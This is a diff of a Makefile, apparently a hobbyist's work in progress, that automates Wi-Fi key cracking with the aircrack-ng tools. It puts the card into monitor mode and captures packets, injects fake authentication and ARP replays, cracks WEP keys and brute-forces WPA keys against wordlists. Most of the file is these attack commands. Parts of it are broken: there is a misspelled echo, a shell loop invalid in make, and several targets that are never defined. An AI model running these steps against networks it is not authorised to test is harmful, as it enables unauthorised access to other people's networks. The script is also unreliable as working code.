@@ -1,55 +1,94 @@
 SHELL := /bin/bash
 
+#main wep
+#needs testing
+wep:
+	echo "starting wep suite\n"
+	echo "initializing terminal 1 vars\n"
+	make wanScan
+	echo "executing terminal 1 processes\n"
+	echo "loading up other terminals\n"
 
-start:
 	#opens a second terminal
-	xfce4-terminal -T 'env PROMPT_COMMAND="unset PROMPT_COMMAND\
-	history -s 
-	'
+	echo "Attempting to open terminal 2\n"
+	xfce4-terminal -T 'env PROMPT_COMMAND="
+	echo\ "terminal 2 open, initializing...\n";
+	make\ wanScan;
+	echo\ "terminal 2 initialized, waiting for network change...\n";
+	sleep\ 10s;
+	make\ ivGen;
+	make\ arpRelay" bash'
+	#third terminal
+	echo "Attempting to open terminal 3\n"
+	xfce4-terminal -T 'env PROMPT_COMMAND="
+	echo\ "terminal 3 open, initializing...\n";
+	make\ wanScan;
+	echo\ "terminal 3 initialized, waiting for network change...\n";
+	sleep\ 11s;
+	echo\ "waiting for IVs to finish\n";
+	sleep\ 30s;
+	ehco\ "cracking\n";
+	make\ crack;
+	" bash'
 
+	sleep 2s
+	make stopNetworkMan
+	make startTerm1
+	echo "make wepCleanup when ready\n"
 
 
 #wep stuff
-wepHowTo:
-	echo "\n4 terminals, init(terminal 1), input vars[int and mac](manually in terminals 1-3),  \n"
-#grabs the first line of the ifconfig 
-#output(if its named something like 'wl'[should be since we're using the usb antenna]), 
-#which will have the things you need
-
-wepInitRest:
+wepInit:
 	ifconfig | grep 'wl' | #osmething terminal 1
 	int=$1
 	mac=$2
 ivGen:
 	sudo aireplay-ng -1 0 -e $essid -a $bssid -h $mac mon0
 arpRelay:
-	sudo aireplay-ng -3 -b $bssid -h $mac mon0 
+	do
+	sudo aireplay-ng -3 -b $bssid -h $mac mon0
+	done while(error)
 crack:
 	sudo aircrack-ng -b $bssid output*.cap
-
 wepCleanup:
 	sudo airmon-ng stop mon0
 	sudo rm output*
 	sudo rm replay*
+	sudo NetworkManager
 
-wepMakeMon:
-	sudo airmon-ng start $int $chan
-wepListenMon:
-	sudo airodump-ng -c $chan --bssid $bssid -w output mon0
 
-#wpa stuff
+#main wpa 
+#testable
+#
 wpa:
-	echo "\ninit, \n"
+	echo "starting wpa suite\n"
+	echo "initializing terminal 1 vars\n"
+	make wanScan
+	echo "executing terminal 1 processes\n"
+	#opens a second terminal
+	echo "Attempting to open terminal 2\n"
+	xfce4-terminal -T 'env PROMPT_COMMAND="
+	echo\ "terminal 2 open, initializing...\n";
+	make\ wanScan;
+	echo\ "terminal 2 initialized, waiting for network change...\n";
+	sleep\ 60s;
+	echo\ "cracking";
+	make\ wpaCrack" bash'
+	sleep 2s
+	make stopNetworkMan
+	make startTerm1
+	echo "make wepCleanup when ready\n"
+#wpa stuff
+wpaCrack:
+	sudo aircrack-ng -w words.txt -b $bssid output*.cap
+	echo "stop here if it worked\n"
+	sudo aircrack-ng -w morewords.txt -b $bssid output*.cap
 
-wpa2Init:
 
 #General Use
 
-#this will output all available networks broacasting
-initTerm1:
-	ifconfig | grep 'wl' | #osmething terminal 1
-	int=$1
-	mac=
+#this will output all available networks broacasting and set related vars
+startTerm1:
 	sudo airmon-ng start $int $chan
 	sudo airodump-ng -c $chan --bssid $bssid -w output mon0
 #maybe add something that parses like a regex to just pull and set the values automagically
